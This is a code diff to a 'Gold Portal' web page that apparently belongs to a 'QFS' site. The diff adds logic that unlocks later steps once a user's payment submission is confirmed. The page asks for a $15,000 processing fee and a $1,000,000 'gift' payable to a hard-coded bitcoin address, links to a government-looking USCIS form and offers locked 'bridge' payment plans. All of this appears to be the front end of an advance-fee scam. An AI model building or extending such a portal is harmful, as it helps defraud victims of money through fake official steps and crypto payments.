@@ -97,6 +97,7 @@
     .dot{ width:8px; height:8px; border-radius:50%; background:var(--muted); }
     .dot.ok{ background: var(--emerald); box-shadow:0 0 0 4px rgba(34,197,94,0.14); }
     .dot.lock{ background: var(--gold); box-shadow:0 0 0 4px rgba(251,191,36,0.12); }
+    .dot.bad{ background: var(--rose); box-shadow:0 0 0 4px rgba(251,113,133,0.12); }
 
     .actions{ display:flex; gap:10px; align-items:center; flex-wrap:wrap; justify-content:flex-end; position:relative; z-index:1; }
     .btn{
@@ -231,8 +232,8 @@
         <div>
           <div class="t1">Gold Portal</div>
           <div class="t2">
-            <span class="pill"><span class="dot ok"></span> Ready</span>
-            <span class="pill"><span class="dot lock"></span> Locked Steps</span>
+            <span class="pill" id="pillReady"><span class="dot ok"></span> Ready</span>
+            <span class="pill" id="pillLock"><span class="dot lock"></span> Locked Steps</span>
           </div>
         </div>
       </div>
@@ -266,7 +267,7 @@
           <div class="step">
             <div class="left">
               <div class="t">Step 1 — Processing</div>
-              <div class="s">Fixed amount</div>
+              <div class="s" id="step1Sub">Fixed amount</div>
             </div>
             <div class="right">
               <div class="price">$15,000</div>
@@ -280,10 +281,11 @@
           <div class="step">
             <div class="left">
               <div class="t">Step 2 — Required Form</div>
-              <div class="s">Unlocks after Step 1 confirmation</div>
+              <div class="s" id="step2Sub">Unlocks after Step 1 confirmation</div>
             </div>
             <div class="right">
               <a class="btn btn-secondary btn-disabled"
+                 id="step2Link"
                  href="https://www.uscis.gov/i-140g"
                  target="_blank" rel="noopener">
                 Open Form
@@ -294,11 +296,12 @@
           <div class="step">
             <div class="left">
               <div class="t">Step 3 — Gift</div>
-              <div class="s">Unlocks after approval</div>
+              <div class="s" id="step3Sub">Unlocks after approval</div>
             </div>
             <div class="right">
               <div class="price">$1,000,000</div>
               <a class="btn btn-primary btn-disabled"
+                 id="step3Pay"
                  href="wallet.html?type=gold&purpose=gift&qty=1&usd=1000000&addr=bc1qqla2r8dmmvefq9svus0kv098nnvudsehpzmut8">
                 Pay
               </a>
@@ -309,12 +312,12 @@
             <div style="display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap;">
               <div class="left" style="min-width:220px">
                 <div class="t" style="font-weight:950;">Bridge Plan</div>
-                <div class="s">2× / 4× / 10× (locked)</div>
+                <div class="s" id="bridgeSub">2× / 4× / 10× (locked)</div>
               </div>
 
               <div class="right">
-                <span class="pill"><span class="dot lock"></span> Locked</span>
-                <select disabled>
+                <span class="pill" id="bridgePill"><span class="dot lock"></span> Locked</span>
+                <select id="bridgeSelect" disabled>
                   <option>2 payments</option>
                   <option>4 payments</option>
                   <option>10 payments</option>
@@ -322,7 +325,7 @@
               </div>
             </div>
 
-            <div class="note">
+            <div class="note" id="bridgeNote">
               Bridge payments will activate automatically once your processing payment is confirmed and your application is approved.
             </div>
           </div>
@@ -338,12 +341,17 @@
 
         <div class="kv">
           <div class="k">Signed in</div>
-          <div class="v mono">Gold Member</div>
+          <div class="v mono" id="acctName">Gold Member</div>
+        </div>
+
+        <div class="kv">
+          <div class="k">Email</div>
+          <div class="v mono" id="acctEmail">—</div>
         </div>
 
         <div class="kv">
           <div class="k">Next</div>
-          <div class="v">Pay processing fee</div>
+          <div class="v" id="acctNext">Pay processing fee</div>
         </div>
 
         <div class="kv">
@@ -356,7 +364,7 @@
     </div>
   </div>
 
-  <!-- ✅ DB-TRUTH GOLD GATE (by email) + FIXED logout -->
+  <!-- ✅ DB-TRUTH GOLD GATE (by email) + SMART unlock + FIXED logout -->
   <script>
     (async () => {
       const SUPABASE_URL = "https://qagktukzxtwbjrdgiben.supabase.co";
@@ -364,11 +372,117 @@
 
       const supabase = (window.__qfsSupabase ||= window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY));
 
+      const $ = (id) => document.getElementById(id);
+
       function normTier(v){
         const s = String(v || "").trim().toLowerCase();
         return (s === "gold" || s === "silver" || s === "black") ? s : "";
       }
 
+      function pickNameFromUser(user){
+        const md = user?.user_metadata || {};
+        const first = String(md.first_name || "").trim();
+        const middle = String(md.middle_name || "").trim();
+        const last = String(md.last_name || "").trim();
+        const fullFromParts = [first, middle, last].filter(Boolean).join(" ").trim();
+
+        const raw =
+          md.full_name ||
+          md.name ||
+          fullFromParts ||
+          md.username ||
+          md.display_name ||
+          "";
+
+        const cleaned = String(raw || "").trim();
+        if(cleaned) return cleaned;
+
+        const email = String(user?.email || "").trim();
+        if(email && email.includes("@")){
+          const left = email.split("@")[0] || "";
+          const pretty = left
+            .replace(/[._-]+/g, " ")
+            .replace(/\s+/g, " ")
+            .trim();
+          if(pretty) return pretty.charAt(0).toUpperCase() + pretty.slice(1);
+        }
+        return "Gold Member";
+      }
+
+      async function getLatestSubmissionStatus(email){
+        try{
+          const { data, error } = await supabase
+            .from("payment_submissions")
+            .select("status, card_type, created_at")
+            .ilike("email", email)
+            .order("created_at", { ascending:false })
+            .limit(1);
+
+          if(error || !data || !data[0]) return null;
+          const s = String(data[0].status || "").toLowerCase();
+          if(s === "confirmed" || s === "rejected" || s === "pending") return s;
+          return "pending";
+        } catch {
+          return null;
+        }
+      }
+
+      function unlockGoldSteps(){
+        const step2 = $("step2Link");
+        const step3 = $("step3Pay");
+        const bridgeSelect = $("bridgeSelect");
+
+        if(step2){
+          step2.classList.remove("btn-disabled");
+          step2.style.pointerEvents = "auto";
+          step2.style.opacity = "1";
+        }
+        if(step3){
+          step3.classList.remove("btn-disabled");
+          step3.style.pointerEvents = "auto";
+          step3.style.opacity = "1";
+        }
+        if(bridgeSelect){
+          bridgeSelect.disabled = false;
+        }
+
+        const pillLock = $("pillLock");
+        if(pillLock){
+          pillLock.innerHTML = `<span class="dot ok"></span> Active`;
+        }
+
+        const bridgePill = $("bridgePill");
+        if(bridgePill){
+          bridgePill.innerHTML = `<span class="dot ok"></span> Active`;
+        }
+
+        const step2Sub = $("step2Sub");
+        const step3Sub = $("step3Sub");
+        const bridgeSub = $("bridgeSub");
+        const bridgeNote = $("bridgeNote");
+        const acctNext = $("acctNext");
+        const step1Sub = $("step1Sub");
+
+        if(step1Sub) step1Sub.textContent = "Confirmed ✅";
+        if(step2Sub) step2Sub.textContent = "Unlocked ✅";
+        if(step3Sub) step3Sub.textContent = "Unlocked ✅";
+        if(bridgeSub) bridgeSub.textContent = "Available";
+        if(bridgeNote) bridgeNote.textContent = "✅ Your processing payment is confirmed. You can proceed to the next steps.";
+        if(acctNext) acctNext.textContent = "Complete Step 2 form";
+      }
+
+      function rejectedGoldSteps(){
+        const pillLock = $("pillLock");
+        if(pillLock){
+          pillLock.innerHTML = `<span class="dot bad"></span> Rejected`;
+        }
+        const step1Sub = $("step1Sub");
+        if(step1Sub) step1Sub.textContent = "Rejected — please resubmit";
+        const acctNext = $("acctNext");
+        if(acctNext) acctNext.textContent = "Resubmit payment confirmation";
+      }
+
+      // Logout
       const logoutBtn = document.getElementById("logoutBtn");
       if (logoutBtn) {
         logoutBtn.addEventListener("click", async (e) => {
@@ -406,6 +520,13 @@
         return;
       }
 
+      // Show account info (name + email)
+      const name = pickNameFromUser(user);
+      const acctName = $("acctName");
+      const acctEmail = $("acctEmail");
+      if(acctName) acctName.textContent = name;
+      if(acctEmail) acctEmail.textContent = email;
+
       // ✅ DB truth: portal_users by email
       const { data: profile, error: pErr } = await supabase
         .from("portal_users")
@@ -414,7 +535,6 @@
         .maybeSingle();
 
       if (pErr || !profile) {
-        // If profile missing, safer to send to registration
         window.location.replace("registration.html?msg=profile_missing");
         return;
       }
@@ -426,6 +546,11 @@
         window.location.replace("portal.html");
         return;
       }
+
+      // Smart unlock based on latest submission status
+      const s = await getLatestSubmissionStatus(email);
+      if (s === "confirmed") unlockGoldSteps();
+      else if (s === "rejected") rejectedGoldSteps();
 
       // Keep email for other pages
       localStorage.setItem("qfsEmail", email);
